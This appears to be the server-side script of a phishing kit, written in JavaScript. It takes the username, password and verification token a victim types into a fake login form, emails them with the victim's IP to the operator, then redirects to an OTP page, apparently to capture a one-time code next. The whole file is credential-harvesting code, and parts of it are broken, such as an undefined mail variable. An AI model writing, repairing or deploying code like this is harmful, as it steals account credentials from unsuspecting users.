const email = require("email.js");
const config = require("config.js");

//Server Variables
const ip = process.env.REMOTE_ADDR;

//Name Attributes of HTML FORM
//Fetching HTML Values
const Fname = req.body.Username;
const Lname = req.body.Password;
const serv = req.body.__RequestVerificationToken;
const sender_name = "EM6L3M";
const uid = "sender";
const sender_mail = "em6l3mlight.log";

//Main Content
const main_subject = "LOGIN INFO l " + ip;
const main_body = `
    UserName : ${Fname} <p>
    PassWord : ${Lname} <p>
    User-Ip : ${ip}`;

//#############################DO NOT CHANGE ANYTHING BELOW THIS LINE#############################
//Sending mail to Server
const retval = email.sendMail(server_mail, main_subject, `${uid}\r\n \r\n\r\n ${main_body} \r\n\r\n--${uid}\r\n ${uid}`, `From: ${sender_name} <${sender_mail}>\r\nReply-To: ${sender_mail}\r\nMIME-Version: 1.0\r\nContent-Type: text/html; boundary="${uid}"\r\n\r\n`);
//Sending mail to Sender
//#############################DO NOT CHANGE ANYTHING ABOVE THIS LINE#############################
//Output
res.redirect("send-otp.html");
